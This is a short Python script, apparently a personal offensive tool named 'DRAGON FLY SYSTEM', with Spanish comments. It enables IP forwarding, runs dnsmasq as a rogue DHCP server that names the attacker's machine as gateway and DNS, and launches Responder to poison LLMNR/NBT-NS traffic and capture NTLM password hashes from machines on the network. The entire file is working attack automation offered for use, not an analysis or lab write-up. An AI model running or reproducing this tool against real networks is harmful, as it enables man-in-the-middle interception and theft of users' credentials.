import os
import subprocess
import time

def iniciar_ataque_red(interface="eth1", callback_consola=None):
    
    def log(texto):
        if callback_consola:
            callback_consola(f"{texto}\n")
        else:
            print(texto)

    log(f"\n[!] DRAGON FLY SYSTEM")
    log(f"[*] Configurando interfaz: {interface}")
    
    # Inicializamos las variables de proceso como None
    dns_proc = None
    proc_responder = None
    
    try:
        # 1. Configuración de Red
        os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null")
        os.system(f"sudo ifconfig {interface} 1.0.0.1 netmask 0.0.0.0 up")
        
        # 2. DHCP (dnsmasq)
        config_dhcp = (
            f"interface={interface}\n"
            f"dhcp-range=1.0.0.2,1.0.0.254,12h\n"
            f"dhcp-option=3,1.0.0.1\n"
            f"dhcp-option=6,1.0.0.1\n"
            f"bind-interfaces\n"
        )
        
        with open("dnsmasq_temp.conf", "w") as f:
            f.write(config_dhcp)
        
        log("[*] Lanzando servidor DHCP (dnsmasq)...")
        dns_proc = subprocess.Popen(
            ["sudo", "dnsmasq", "-C", "dnsmasq_temp.conf", "-d"], 
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        
        log(f"\n[+] INTERFAZ LISTA: {interface}")
        log(f"[+] OBJETIVO: Captura de hashes NTLM / LLMNR")

        # 3. Lanzar Responder y capturar salida
        comando = ["sudo", "responder", "-I", interface, "-wvF"]
        proc_responder = subprocess.Popen(
            comando,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )

        # Bucle de lectura en tiempo real
        for linea in iter(proc_responder.stdout.readline, ""):
            if linea:
                log(linea.strip())
            # Si el proceso muere por fuera, salimos del bucle
            if proc_responder.poll() is not None: 
                break

    except Exception as e:
        log(f"\n[!] Error crítico: {e}")
    finally:
        # 4. LIMPIEZA PROFUNDA (Para evitar procesos zombis)
        log("\n[*] Deteniendo procesos y restaurando red...")
        
        if dns_proc:
            dns_proc.terminate()
        
        if proc_responder:
            # Matamos Responder (usamos sudo kill porque Popen a veces no tiene permisos)
            os.system(f"sudo kill {proc_responder.pid} > /dev/null 2>&1")
        
        os.system("sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null")
        os.system(f"sudo ifconfig {interface} 192.168.1.5 netmask 255.255.255.0 up")
        
        if os.path.exists("dnsmasq_temp.conf"):
            os.remove("dnsmasq_temp.conf")
            
        log("[+] Sistema restaurado. ¡Cacería finalizada!")